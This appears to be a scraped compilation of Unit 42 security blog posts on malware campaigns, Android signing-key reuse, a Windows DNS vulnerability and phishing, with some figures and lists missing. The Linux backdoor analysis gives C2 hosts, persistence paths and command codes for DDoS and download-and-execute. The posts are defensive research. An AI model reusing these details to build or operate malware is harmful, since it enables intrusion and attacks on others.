"If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200."
"Palo Alto Networks Cortex XDR customers may leverage the following XQL queries, written by the Cortex Managed Threat Hunting service experts, to hunt their datasets for indicators related to WhisperGate malware: The Unit 42 Threat Intelligence team remains vigilant in monitoring this evolving situation, is actively hunting for known indicators from recent events and is ready to put protections in place to thwart attacks against our customers."
"Product-specific protections have been implemented as a result of research performed in recent days, and those protections will be augmented as needed as more details come to light."
Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
"Updated March 4, 2022, at 6:15 a.m. PT."
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
At 06:47 PST on May 20 Palo Alto Networks WildFire detected the start of the latest Kuluoz spam campaign.
"The total number of e-mails detected quickly rose to over 30,000 per hour around noon PST and had not begun to slow down as of 1:30PM PST."
Kuluoz is a descendant of the Asprox malware and spreads by sending copies of itself as an e-mail attachment.
"As the malware infects more systems, the systems begin sending more e-mails which leads to more infections."
"Kuluoz makes money for its owner by installing other malware, such as crimeware or fake antivirus programs."
"Kuluoz e-mails often trick the reader into thinking they are delivery notifications (such as UPS or Fedex), or notices from airlines or payment processors."
In this case the e-mails claim to contain a document about a court case.
Subject: Hearing of your case in Court
"From: Notice of Appearance Pretrial Notice, Please, download the copy of the court notice attached herewith to read the details."
Note: The case may be heard by the judge in your absence if you do not come.
"Truly yours, Clerk to the Court."
Olivia Smith
Each e-mail carries one of the following attachments: These attachments are different versions of the malware that has been packed to evade antivirus engines.
"Twelve of the 53 scanners on virustotal.com now detect the first variant of the malware, but only three detect the latest version."
"To determine where the highest number of infected nodes are, we mapped the sending IP address for each of the attach e-mails to their rough geographic location."
Geographic Distribution of Koluoz Spam Nodes in North America Thus far we’ve detected the following command and control servers in use.
"The network traffic generated by each Trojan uses the HTTP protocol, and despite its use of port 443, is not encrypted with SSL."
"As with most fast-spreading malware, antivirus engines will typically begin detecting the files a day or two after the spread has begun."
"While we haven’t seen any indication that the spam volume has begun to slow down, we do expect the campaign to wind down in the next 24 hours, but a new campaign will probably be close behind."
WildFire users can rest assured that they’ll be protected from whatever Kuluoz has in-store next.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Following a recent study of apps in the Google Play Store, let’s discuss several security risks caused by the bad certificate management practiced in many Android apps, from social to mobile banking."
All Android apps must be digitally signed with a certificate from the developer.
"As described in Google’s official document, the app developer is required to create a keystore with a set of private keys, and then use the private key to generate a signed version of apps."
This key has to be valid for at least 25 years.
These certificates do not have to be generated by a certificate authority and can instead be self-signed.
"Because this is simpler and allows the author to retain the private key, the majority of Google store apps use self-signed certificates."
"This means it is the developer’s responsibility to keep the private key safe, whether that developer is a 13-year-old or a multi-national company."
"As this means the security protecting private keys varies widely, the security risks of bad certificate management cannot be ignored and must be identified, and where necessary, mitigated."
Security researchers are starting to take note and publish on this subject.
"For example, BlueBox recently revealed the Fake ID vulnerability, which exploits an app’s certificate verification process within the Android OS."
If they haven’t already
", soon attackers and malware authors will turn their attention to exploiting vulnerabilities surrounding Android app certificates."
"When an app is published to the Google Play Store, the certificate information is included within the APK file."
To view the certificate information just open the given APK file as a zip file.
The certificate information is stored within the certificate’s “/META-INF” folder.
You can use keytool or openssl tools to view the certificate information.
An example taken from the popular Angry Birds app is shown in Figure 1.
The certificate fingerprints (circled in red) are what can be used to uniquely identify a certificate.
"Figure 1 These digital certificates, self-signed or not, are the keys to updating apps in the Android ecosystem."
It is a primary reason the expiration dates are set so far into the future and developers are able to self-sign certificates.
The only way to update an app is for the developer to sign the update with the same digital certificate originally used to publish the app.
"If a developer wants to use a different certificate, they must publish the update separately as a new app."
"Furthermore, all Android apps published using the same certificate have a trust relationship between them."
Android allows apps signed by the same certificate to run in the same process and treats them as one single application instead of separate ones.
"It also allows multiple apps with the same certificate, if using signature-based permission checks, to expose functionality and exchange code and data amongst themselves."
"This is convenient for developers, which is great, but it is also convenient for hackers, which is not."
"Losing control of a certificate’s private key, or using an insecure private key, can have severe security consequences."
"For example, if an attacker obtained the private key of an app, he or she could create a fake APK file, sign it using the same certificate as the legitimate app, and replace the targeted app with fake app on the device silently using the “Application upgrade” procedure."
"In addition, if the attacker can’t create an app with the same name as the targeted app, he or she can still check the “SharedUserId” option."
This allows apps with different package names but signed with the same certificate to share permissions and stored data.
"Because of this, app developers should be extremely careful about re-using certificates when signing their apps."
"Ideally, an app developer should generate a unique private key for each unique app they post in the Google Play Store."
"Unfortunately, during our study of apps posted in the Google Play Store we collected approximately 246,000 Android apps but only 11,681 certificates."
The distribution of the number of apps sharing the same key is shown below.
The X-axis is the number of apps sharing the same certificate.
The Y-axis is the number of certificates.
"For example, the number of certificates used by only one app is 1,323."
"About 6,925 certificates are used to sign between 6 and 19 different apps."
Figure 2
"As we see in this distribution, a lot of developers sign different apps with the same certificate."
We further investigated the following cases:
1. Signing apps with a publicly known private key Many key pairs are well known in the development community.
"The most famous set of key pairs would be the key pairs included within the AOSP source files (in Table 1, below)."
More key pairs can be found in developer forums and academic research.
"Table 1 If one app is signed using the publicly known private keys, it is easy for other apps on the same device to replace this vulnerable app with another APK file, silently with no user knowledge or interaction."
We scanned our inventory of APK files downloaded from the Google Play Store and found at least 87 apps using the “testkey” in Table 1.
"According to the Google Play Store, these 87 apps have been downloaded more than 1.6 million times."
For security reasons we are not posting the names of any of these apps.
"Under no circumstances should developers ever use private keys that are publicly available, nor should users download them."
"However, it isn’t easy for users to know the app they’re downloading is using a compromised private key – the onus for this is squarely on developers."
"2. Mobile banking apps sharing one single key Mobile banking apps are particularly sensitive with significant security concerns, which is why we were surprised to discover one certificate was used to sign more than 300 mobile banking apps in the Google Play Store."
"This practice is not necessarily dangerous, as long as the developer does not share the key with the various banks that contracted the applications."
We’ve contacted the developer to confirm they have retained sole custody of the keys.
"Of course, even with out-sourced application development, app owners should prefer to hold their own key."
"Whoever controls the key controls updates for the application forever, and a key shared between applications in this way can never be transferred to a financial institution without compromising the security of all of the other apps signed with it."
The developer is aware of this concern and plans to encourage more of its customers to sign their own applications in the coming year.
"In addition to our research, the Baidu Security team in China recently found 23 mobile banking apps sharing the same certificate hosted by a third party app developer and reported the discovery to the CNCERT in China."
3. Third party app developers using the same key for all apps generated for all customers
The app developer industry is booming.
These developers help customers build mobile apps for their businesses easily and quickly.
They serve an important role for the majority of businesses that do not have in-house developers.
"Unfortunately, we uncovered some of these developers using the same certificate for every app."
"Again, using the same private key is probably due to the convenience in app management."
"But as we noted earlier, apps signed by the same certificate can automatically grant sharing relationships amongst themselves."
"This means all of the apps created by these developers, regardless of intended use, could be used maliciously."
Table 2 shows select top app developers using the same certificate in signing all their apps.
"For security reasons, we have masked the names."
Table 2 Digital certificates are a critical component of the security of Android apps.
"Unfortunately, many app developers in the Google Play Store have ignored these concerns in favor of convenience."
While in some cases that may be justified – the app may not contain any important or identifying information – in many of the cases we discovered it is not.
This poses great potential security risks to both app users and app owners.
We encourage developers to reconsider their stance on this issue and where necessary make changes before a significant security event happens.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
A backdoor implant is an increasingly common mechanism for maintaining unauthorized access and control over a computer asset.
The terms remote administration tool (RAT) and trojan downloader are often used synonymously with such implants.
"Once installed (i.e. implanted on a system), the modern backdoor typically offers much more than simple (i.e. command line) access to a system."
"Depending on the backdoor’s specialization and sophistication, it can also capture keystrokes, take screenshots, scrape memory for valuable information, search for files meeting certain criteria, query databases, download files and additional malware, exfiltrate data and files, and even serve as an attack platform."
"Effectively, a backdoor implant affects loss of control over a computer asset."
"The tangible and intangible impacts of this loss of control vary based on respective backdoor capabilities, and may include the following: leakage of authentication credentials, loss of intellectual property, exposure of sensitive information, negative standing or reputation, and various levels of liability for actions executed on or from the compromised asset."
"Recently Palo Alto Networks discovered a backdoor program ( md5: b826fb1253a52a3b53afa3b7543d7694, sha256: 6bedd1b0716fe7632188932451f75295346836545e6d2bfee1b56121e02ca110 ) that is used to control a linux operating system."
"This particular linux backdoor will install itself to ""/usr/bin/btdaemon"" and create a startup service at ""/etc/init.d/bluetoothdaemon"" with symbolic links so that it will run in any startup mode. The file contents are a simple bash script that runs the original btdaemon file."
The backdoor when run will create threads for each connection listed in its config file. The sample that was caught by our systems contains 3 IP addresses in its config file.
"For each IP address the btdaemon service will attempt to make a connection on UDP ports 53, 80, 110, and 443."
"Upon successful connection it will send the string ""¡°MlCROS0FT|1.2 Apr 26 2014 02:37:05|Linux Kernel Version¡±"" and will wait for an ""Auth"" packet from the server."
"If the backdoor receives a packet in the form of a ""cmdType|cmdBody"" it will check the cmdType list and execute the equivalent instruction. Valid instructions are between 0-9 and there functionality varies depending on the command."
"While running the btdaemon process also inspects whether there is an "".IptabLes"" or "".IptabLex"" local process, and sends back status for monitoring purposes. If the ""disablerun"" command is sent the backdoor will download a file named ""run.txt"" from one of the following URLs: The file data is in the format ""exe_path_1 | exe_path_2 | ... | exe_path_N"". If none of the paths is correct then a ""getsetup.rar"" file is downloaded and run."
This is an ELF file and there are various encrypted portions within it.
There exist two embedded zlib-encrypted blocks at file offset 0x8C0C0 and 0xE6B40 respectively.
"When run if the filename does not include the ""IptabLes"" string then the data is decrypted, written to disk, and then executed, installing itself as a startup service on the machine and place itself in one of the following locations: The second encrypted block is configuration data, which includes some IP addresses and DNS data which is used when it writes the first decrypted block to a file."
"""dns.po888.com|122.228.242.51|119.145.148.56|162.221.13.82""."
"If the file is run in a path including the ""IptabLes"" string then it installs itself as a startup service and proceeds into its main loop."
"Either path the ""getsetup.rar"" file takes is meant to ensure that it is installed as a startup service, ensuring persistence. Once the file is running it creates a process identifier (PID) so that only one instance is running at any given time."
The file will connect to an IP and port configured from the configuration data and sends along information that includes the cpu and memory information.
"If the file does not receive any data within 30 seconds it will send a ""xy"" response back to the server."
If the file does receive data from the server in excess of 20 bytes it will be in the following format: <2 byte data length><0xABCDEF88><zlib-encrypted data> The decrypted data will contain the following fields: The attack type field is used to determine if a SYN DDoS or DNS DDoS is used in an attack.
The Src IP Begin and End are the start and ending IP ranges used as a fake src addresses in the DNS DDoS. The IP range can also be controlled by global variables within the binary itself as well.
"If the received data has 0x22 as the first set of bytes then the received data will be in the following format: <0x22><IP Address 1(4bytes)><IP Address 2 (4bytes)> It will also do the following UDP connection test: If the first value in the packet is 0xC8 then the file will set ""g_mainsrvinfo.srandipb"" and ""g_mainsrvinfo.srandipe"" and ""g_mainsrvinfo.udpport"" to the passed in values."
"If the first value in the packet is 0xCC then the file will set ""g_mainsrvinfo.srandipb"" and ""g_mainsrvinfo.srandipe"". If the first value in the packet is 0x33 the file will use tcp to download a file and execute it."
If the first value in the packet is 0x20 the file will delete all DDoS tasks.
If the first value in the packet is 0x10 then the file will send back the current socket handle as a response back.
Currently these IP addresses are alive and active.
"Palo Alto Networks strongly recommends you inspect your systems and update your firewall rules and IPS systems. Palo Alto Networks customers with active subscriptions to Threat Prevention are protected against these threats automatically, signature #13469 was released to protect against this specific threat."
"Similar to any other malware family or threat, Palo Alto Networks customers should use the entire security framework for threat mitigation and threat prevention coverage. Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"This post is also available in: 日本語 (Japanese) In July 2020, Microsoft released a security update, CVE-2020-1350 | Windows DNS Server Remote Code Execution Vulnerability, for a new remote code execution (RCE) vulnerability."
"This vulnerability exists within the Microsoft Windows Domain Name System (DNS) Server due to the improper handling of certain types of requests, specifically over port 53/TCP."
"Exploitation of this vulnerability is possible by creating an integer overflow, potentially leading to remote code execution."
This vulnerability only affects Windows DNS and the following builds of the Microsoft Windows operating system (OS):
"As always, we recommend our customers patch their systems as soon as possible."
Microsoft also provided a workaround in cases where patches are not immediately possible.
Please review KB4569509: Guidance for DNS Server Vulnerability CVE-2020-1350 for more details.
Palo Alto Networks Threat Prevention and Cortex XDR provide protection against the exploitation of this vulnerability: Palo Alto Networks will update this Threat Brief with new information and recommendations as they become available.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Overview Palo Alto Networks Unit 42 threat research team has just uncovered a new set of attacks by the Sofacy group using malicious emails targeting foreign affairs agencies and ministries in North America and Europe, including a European embassy in Moscow."
"Given the significant activity attributed to Sofacy, and the new evidence directly targeting the diplomatic community, Palo Alto Networks wants to ensure that foreign affairs agencies around the world understand how the attacks are carried out, and what agencies and personnel can do to protect themselves."
"The Sofacy Group (AKA APT28, Grizzly Steppe, Fancy Bear, STRONTIUM, Sednit, Tsar Team, Pawn Storm) is a well-known hacking organization widely reported to be associated with Russia by the US Intelligence Community, numerous media reports and other cybersecurity companies."
"Sofacy Group has been associated with many attacks against targets around the world, including the International Olympic Committee (IOC) in 2018, the World Anti-Doping Agency in 2016, the Dutch Safety Board in 2015, and German, French, Ukrainian, and Dutch political and military targets throughout 2014 through 2018."
How the Attacks are Carried Out: Via Email
These attacks begin with an email sent to a carefully chosen target in the agency.
The recent spoofed emails we have seen are forged to appear to come from Jane’s 360 Defense Events to tell the recipient about events coming up in 2018.
The figure below shows an example.
"Once the recipient opens the Excel spreadsheet, she or he does have trouble viewing the document: it opens as a blank spreadsheet."
The attackers are relying on the recipient to follow the instruction in the email and click “Enable Content”.
You can see below what the spreadsheet looks like and the enable content button.
Clicking the “Enable Content” button is the key to the attack.
"While it makes the text in the spreadsheet visible and so seems to solve the problem, it’s a trick: It’s really running a program that silently installs a program on the system."
"This program gives the attackers complete control over the computer and can enable them to copy documents, usernames, passwords, account information and even take screenshots."
How you can protect yourself
There are several things that you can do to help protect against these latest Sofacy attacks and others like it.
"With the public awareness of this particular decoy, it is highly likely that the Sofacy group will shift their attacks to spoof emails from a different organization to continue carrying out these attacks."
"Additionally, this attack technique is not exclusive to the Sofacy Group."
"Therefore, these suggested actions can protect not just against these known attacks but others like it."
An unexpected email message with an attachment that says you should “enable content” has a high likelihood of being malicious in some way.
"If you get an email like this, you shouldn’t open the attachment and click “enable content”."
"Instead, you should verify that the message and the attachment are legitimate by contacting the sender in some way other than replying to the email (because replying to the email may go back to the attackers who will, of course, say it’s legitimate)."
"Or, just delete the message and report it to your security team."
Palo Alto Networks Unit 42 regularly researches threats like these and provides information about them on our blog.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
This Unit 42 blog post provides an update on the threat situation surrounding the Bad Rabbit ransomware attacks.
Attack Overview
"Bad Rabbit is a ransomware attack that, at the time of this writing, appears to primarily be affecting countries in Eastern Europe."
"While not spreading as widely as the Petya/NotPetya attacks, reports indicate that where Bad Rabbit has hit, it has caused severe disruption."
The Ukrainian CERT has issued an alert on Bad Rabbit.
"As detailed below, Bad Rabbit gains initial entry by posing as an Adobe Flash update."
Once inside a network it spreads by harvesting credentials with the Mimikatz tool as well as using hard coded credentials.
Bad Rabbit is similar to Petya/NotPetya insofar as it encrypts the entire disk.
We are not aware of any reports of successful recovery after paying the ransom.
"Because the initial attack vector is through bogus updates, Bad Rabbit attacks can be prevented by only getting Adobe Flash updates from the Adobe web site."
Reconnaissance This attack does not appear to be targeted.
"Therefore, there appears to be little reconnaissance as part of this attack."
Delivery/Exploitation
"According to ESET, the initial infection vector for Bad Rabbit is through a fake Adobe Flash update that is offered up from compromised websites."
Proofpoint researcher Darien Huss‏ has reported this fake update was hosted at 1dnscontrol[.]com.
Reports differ on whether this is delivered through social engineering that convinces the user to install the fake update or if it is delivered silently through unpatched vulnerabilities (i.e. “drive-by” installs). Lateral Movement
"Once inside a network, Bad Rabbit propagates itself to other systems."
Reports indicate that it harvests credentials using Mimikatz and Maarten van Dantzig reports it also uses common hardcoded credentials to spread.
"Command and Control (C2) At this time, we have no information on command and control for Bad Rabbit."
Conclusion Bad Rabbit is not as widespread of an attack as Petya/NotPetya but is causing severe disruptions where it is occurring.
It is similar to Petya/NotPetya in terms of the impact of a successful attack.
"However, it is a different attack with different malware."
We will update this blog with new information as it becomes available.
"For information on how Palo Alto Networks products prevent Bad Rabbit, please see our Palo Alto Networks Protections Against Bad Rabbit Ransomware Attacks blog post."
"As always if you have any questions, please come to the Threat & Vulnerability Discussions on our Live Community."
"Version Summary October 24, 2017 2:30 p.m. PT Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"Palo Alto Networks WildFire detected a new Android Trojan on May 7th, 2014 when a customer using our enterprise security platform downloaded the malicious application from the Google Play store."
"We’ve named the malware family Funtasy, based on the domain it uses for registering compromised phones to the premium SMS service."
The first version of Funtasy we detected is a fake television remote control application.
Figure 1: Funtasy Trojan Disguised as TV Remote Control App.
"A developer using the ID “fun app” published the Trojan, and the remote control application they uploaded on April 21 is their most successful app so far, with between 10,000 and 50,000 downloads on the play store."
"Based on the reviews, the application does not function very well as a remote, but in reality it doesn’t contain remote control capability."
"There’s no mention of a premium SMS service in the description, but a review of the permissions reveals that the program will have complete access to SMS messages."
Figure 2: Remote control app requests complete control over your SMS messages.
"After the user installs the remote application and opens it, they are presented with a terms of service screen."
This is the user’s only chance to realize that opening this application is going to cost them dearly.
Figure 3: Remote control app terms of service.
"If you can’t read the fine print, I don’t blame you."
Here’s the text decoded from the application’s source code.
"Servicio de suscripción para usuarios Movistar, Vodafone, Orange, Yoigo, R y Simyo para mayores de edad o menores con capacidad legal para contratar, prestados por (FUNTASY MOBILE S.L., operador titular ARGATEL SOLUTIONS SL, n. atención al cliente 902 303 803 ó inf@argatel.com, apartado de correos 167, 17001 Girona."
"Coste por SMS recibido 1.46 euros/sms (IVA incluido) más el coste de navegación WAP, que dependerá del operador que tenga contratado."
Máximo 10 sms/semana.
El límite máximo de facturación del servicio puede variar en función de tu operador (18 a 30 euros/mes).
Baja automática para cancelar el servicio: envía BAJA al 797977.
"This message is pretty straightforward, assuming the user actually reads it."
It explains that by opening the application the reader agrees to receive up to 10 SMS messages a week at a cost of 1.46 euros each.
The maximum cost per month should between 18 and 30 euros per month.
If the user would like to unsubscribe they can text “BAJA” to 797977.
"Any user who reads this message and understands it is unlikely to agree, but Funtasy does not even wait for their agreement."
"While the terms page is on the screen, in the background the Trojan checks to see if the phone is attached to a network with one of the following mobile network codes (MNC): Each of these networks is Spanish, except for a single Australian network."
"This data, along with an encoded version of the Terms of Service are stored as static strings in the Android package file."
"Constants.java After determining the phone is on one of the correct networks, the malware searches for the phone’s mobile number."
It does this in three ways:
"Util.java With the phone’s number captured, Funtasy then registers the mobile account with a premium SMS service by sending an HTTP POST request to the following URL. The request is made without the users knowledge, they have no choice to select a number."
"Of course, premium SMS services require that the user confirm that they want to sign up by sending incoming SMS message containing a PIN."
"Funtasy intercepts this message, parses out the PIN and sends it back to the registration server, completing the enrollment process."
"IncomingSms.java Of course, once users begin receiving the SMS messages, they are likely to unsubscribe from the service they never really wanted."
"To prevent this, Funtasy blocks the incoming messages before they are displayed to the user and modifies the time stamp on each message to make them appear to have been received 15 days earlier."
This moves it to the back of the inbox there the victim is unlikely to ever see it.
"Funtasy does this even when the victim uses alternative SMS managers, like Google Hangouts or GO SMS Pro."
"After evaluating the remote control app and finding malicious behavior, we decided to evaluate all of the other applications published by “fun app”, and found 12 more which all contains the exact same behavior. Figure 4:"
"Additional “fun app” applications, all contain the Funtasy Trojan."
Each of these applications is designed to appear like a legitimate application already in the app store.
"To raise the ranking of these apps, the author appears to have given many of them five-star ratings."
"Unfortunately for them, this gave us additional insight into their operation."
"To rate and comment on applications, users must have a Google account."
One account using the name “Oscar Sanchez” gave high ratings and positive comments to many of the “fun app” applications.
"He also rated apps made by two additional publishers with the names ""MilApps101"" and ""Milapps102."""
"Between the two of these developers they have produced five applications, and we’ve found that every one of them contains the Funtasy Trojan."
While the name “Oscar Sanchez” may be a pseudonym
", Whois data indicates it was also used to register the domain hosting the Funtasy Mobile premium SMS service."
In total we’ve found 18 different applications in the Google Play store that contain the Funtasy Trojan.
"Each of these files also has the same internal class structure, which is represented by the tree structure below."
Figure 5: Funtasy internal class structure.
Researchers interested in investigating them further can find more information in the table below.
"Using this Trojan the attacker could be generating up to 30 euros per month for over 67,000 infected mobile phones."
"That adds up to 2 million euros per month, but the actual number is likely much lower."
Many of the users who downloaded the tool may not be using one of the targeted Spanish or Australian networks.
Figure 6: List of Android APK files infected with Funtasy Trojan
"Users who want to defend against the Funtasy Trojan should not rely on traditional antivirus programs, as they do not currently detect this threat."
Common sense is the best defense against these types of abusive programs.
"While many users breeze past the list of permissions required when installing new apps, readers of this blog should ask themselves, “Does my electronic bible need to read my SMS messages?” Sign up to receive the latest news, cyber threat intelligence and research from us"
Please enter your email address!
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"On July 22, Palo Alto Networks threat intelligence team, Unit 42, released our first report on the evolution of “Silver Spaniel” 419 scammers."
Of particular note is how these actors use a Remote Administration Tool (RAT) named NetWire (part of the NetWiredRC malware family).
"This RAT gives a remote attacker complete control over a Windows, Mac OS X, or Linux system through a simple graphical user interface."
"To better understand this RAT, our team reverse engineered the communication protocol that NetWire uses."
Today we have released a tool that decrypts NetWire traffic and outputs any commands issued by the attacker.
"NetWire uses a custom, TCP-based protocol."
"The producer of the NetWire WorldWiredLabs, states that the tool uses 256-bit AES encryption, which we found to be accurate."
The tool generates two encryption keys using a static password that the attacker chooses when creating the NetWire binary.
Each packet has the following structure: < 4 Byte Little-Endian length > < 1 Byte Command >
< Data >
"The shortest possible packet is the “HeartBeat” command, which NetWire generates every 10 seconds."
The initial packet from the client to the server shows a data and command length of 65 bytes (0x41 listed at the beginning of the packet) with a command byte of 0x03. Within that data is a 32-byte seed value followed by a 16-byte initialization vector (IV) value.
The client then combines the 32-byte seed value with the static password in a predetermined fashion to form an AES key.
"Upon receiving the initial packet, the server uses the seed value and password to generate the client’s session key."
It then generates its own 32-byte seed value to create it’s own session key and sends the seed value to the client.
The client combines this with the password and generates the same key.
"At this point, the key exchange is complete and both client and server hold the same two keys, which they can use to encrypt and decrypt traffic."
"With the two keys in place, the malware uses the AES algorithm to encrypt traffic using Output Feedback (OFB) mode (Picture courtesy of Wikipedia). The output of the block cipher encryption is eXclusive OR’ed (XOR’d) with 16 bytes of ciphertext to decrypt. Each subsequent block of ciphertext will use the previous encrypted data as the IV passed into the block cipher encryption function."
"The malware has a full suite of possible commands, 76 to be exact."
"Upon receipt of a command from the server, a single function is called to decrypt the payload data and execute the received instruction."
The value in the command byte determines which of the commands is run through a 76 way switch statement.
A complete list of the possible commands available in NetWire was documented by CIRCL in April. The NetWire decoder uses data from a packet capture file to generate the client and server session keys then decode the remaining encrypted packets.
"The user needs to know the IP of the infected client, the port used by malware and the encryption password to properly decode the traffic."
"This password is set to “Password” by default, but can be retrieved from NetWire binaries if the attacker used something more secure."
The usage for the tool is show below.
"At this time the tool works against the latest version of NetWire, 1.5c."
We hope this tool will be valuable to incident responders and others who are plagued by NetWire infections.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
Unit 42 has recently been investigating a new malware family called Reaver.
"While we have identified it as being active since late 2016, Reaver has been used sparingly, with only a small number of unique samples identified."
"Its targets have been movements the Chinese government consider dangerous, also known as the “Five Poisons.”"
"We found that the Reaver malware family has shared command-and-control (C2) infrastructure overlap SunOrcal malware, and that these have been used concurrently since late 2016."
While investigating Reaver we recently also discovered a new variant of the SunOrcal malware family.
"While the SunOrcal malware family has been confirmed to have been active since 2013, possibly even earlier, this new variant has been observed targeting regions outside of the typical target radius for this threat group, now expanding to include Vietnam and Myanmar."
How it Works
Emails were sent to targets containing malicious attachments.
"Targeting a Vietnamese speaking audience, one of the malicious documents mentions Donald Trump and the disputed South China Sea area."
This is a classic lure technique – including something the target will find interesting or important causing them to open the file and download the malware on to the victims’ system.
"How to Defend Against it These malware attacks utilize email phishing, and relies on targets opening the malicious email attachment."
Security awareness is critical to avoid falling victim to such an attack.
"General email best practices: If you are unsure of the legitimacy of the email, contact the sender directly over the phone or by typing a trusted URL directly in your browser or saved bookmark."
"Additionally, keeping your systems and devices updated with the most current operating system and web browser is a general security best practice, as well as enabling multi-factor authentication to prevent an attacker from abusing credentials should they successfully capture them"
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"For a moment, put yourself in the shoes of a cyber criminal."
"You’ve collected an array of tools (malware), built up your infrastructure (command and control (C2) servers) and you have a process to make money off your hard work."
You wake up on Monday morning and the domains your carefully built malware uses for command and control are shut down.
"Some security researcher has taken control of them, completely halting your operation."
"This would certainly be good news to anyone reading this blog, but for the criminal it’s a big setback and source of frustration."
These kinds of takedowns are the impetus for some of the most impressive developments in malware technology over the last decade.
"Once attackers have infected a PC through some exploit or social engineering, one of their major challenges is keeping control of that system."
"Antivirus programs running on the PC are trying eradicate the threat, the command and control domains and IPs are being added to denylist and blocked by networks around the world."
Many malware authors have taken to building complex mechanisms to ensure that their malware is resistant to these kind of blocks and takedowns.
"Some of the more innovative mechanisms include: These mechanisms are often only used when the primary (and simpler) C2 mechanism has been shut down, but their use makes shutting down a botnet much more challenging."
Last year we highlighted two malware families on this blog: CryptoWall 2.0 and Dyreza/Dyre.
CryptoWall is one of multiple ransomware families that generated income for the attacker by encrypting files on the infected PC with a private key that is in the control of the attacker.
The attacker then charges a ransom (normally around $500) to give up the key that will unlock the files.
"In October, CryptoWall 2.0 began using the Tor anonymity network to serve web pages to infected users who wanted their encrypted files back."
In this case a legitimate service (Tor) was being abused by CryptoWall so it could avoid having its C2 servers shut down.
"In the past few weeks we've seen another anonymity network, I2P, being abused by both the latest version of CryptoWall (3.0) and the Dyre banking Trojan."
"While I2P is far less popular than Tor, it provides similar functionality to the user."
I2P is an overlay network on top of the Internet that creates encrypted links between nodes that are running the I2P software.
"I2P users can access specific I2P services that are only accessible on I2P, or access Internet resources without exposing their IP address. In the case of CryptoWall 3.0, the malware is attempting to access multiple .i2p resources only accessible through I2P, also known as “eepSites.” The CryptoWall 3.0 uses I2P in the same way CryptoWall 2.0 used Tor, to give victims access to a decrypting service to get their files back."
"The Dyre banking Trojan has multiple C2 mechanisms, including encrypted HTTPS requests to a list of hard-coded IP addresses, a DGA generating 1,000 new domains each day as well as an I2P based plugin."
These many C2 mechanisms make Dyre much more difficult to fully take down than a simple single (or small group) of C2s.
the following IP address are known Dyre C2 servers.
"It’s not possible to list all of the domains generated by the DGA, which is the main advantage of this mechanism. To protect your network from the I2P communication used by both Dyre and CryptoWall 3.0, the easiest route is simply to identify I2P traffic and block it completely."
"While there are certainly many legitimate reasons to use an anonymity network, many organizations should be wary of I2P (or Tor) traffic transiting their network."
Palo Alto Networks App-ID technology can identify I2P traffic as well 51 other tunneling applications.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot!"
"By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In recent research, Palo Alto Networks found attackers were creating fake versions of some well-known and well-trusted websites – including Adobe, DropBox, Facebook, and others- and putting malicious links to these sites into phishing emails sent to unsuspecting victims."
Here we explain this type of attack and what you should do.
What is it?
A method attackers use to target you using email that you might not know about.
"Why should I care, what can it do to me?"
Attackers can gain access to your personal and financial information.
"They can also steal your computer’s processing power to mine for cryptocurrencies, which slows down your system."
How can I prevent it?
Avoid clicking on links that you get in email.
"If you get an email and need to go to that website, type the address in your web browser yourself."
"If the link is an email from someone you know, you can also contact them to find out if they meant to send it, and if it is safe to visit."
What causes it?
Attackers know that people will click on links in email.
Especially when you get an email from someone that looks like someone you trust.
How does it work?
Attackers send emails that appear to be from a person or company that you trust.
"These emails contain malicious links that, when clicked on, lead you to an attacker’s page."
"In addition to taking steps so the attacker’s page mimics a legitimate one, attackers often mirror well known security images, like the lock symbol, to convince you that you are on a secure site."
"Once you’re on the attacker’s page, the attackers may ask you for personal information (like usernames, passwords, and bank account information) or to install software, or both."
"In recent research, we found attackers were using fake versions of some well-known and well-trusted sites:"
About: Threat Briefs are meant to help busy people understand real-world threats and how they can prevent them in their lives.
"They’re put together by Palo Alto Networks Unit 42 threat research team and are meant for you to read and share with your family, friends, and coworkers so you can all be safer and get on with the business of your digital life."
"Got a topic you want us to write about for you, your friends, or your family?"
Email us at u42comms@paloaltonetworks.com.
"Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address!"
"Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement."
"In February, Microsoft awarded $100,000 to Yu Yang (@Tombkeeper) for reporting a new mitigation bypass technique as part of Microsoft’s Bounty Program."
Yu later demonstrated his research at CanSecWest in March.
"In his slides, he mentioned that a ""god mode"" of Internet Explorer could be turned on by a one byte overwrite."
"However, he had to heavily redact this information due to an agreement between himself and Microsoft."
"After his slides were released, researchers began working to determine what the missing parts were."
"And before long, Yuki Chen (@guhe120), a Chinese researcher, posted his answer."
"Although the code was removed soon after posting, a copy was still maintained and used by Metasploit."
